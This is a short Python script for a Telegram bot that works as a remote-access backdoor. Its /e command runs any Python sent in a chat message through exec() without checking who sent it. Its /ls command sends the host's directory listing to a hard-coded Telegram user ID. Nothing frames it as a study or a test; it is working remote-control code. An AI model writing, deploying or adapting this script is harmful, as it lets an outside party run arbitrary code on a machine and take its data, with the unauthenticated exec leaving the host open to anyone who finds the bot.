import telebot, os

bot = telebot.TeleBot(os.getenv("YOUR_TELEGRAM_BOT_API"))
super_user = 5645707560

@bot.message_handler(commands=["ls"])
def ls(message):
    all_files = []
    for file in os.listdir():
        if os.path.isdir(file):
            all_files.append("📁 " + file)
        else:
            all_files.append("📄 " + file)
    bot.send_message(super_user, "\n".join(all_files))

@bot.message_handler(commands=["e"])
def text(message):
    bot.send_message(super_user,  message.text[3:])
    try:
        exec(message.text[3:])
    except Exception as e:
        bot.send_message(super_user,  f"Exception occured:\n{e}")







bot.polling(True)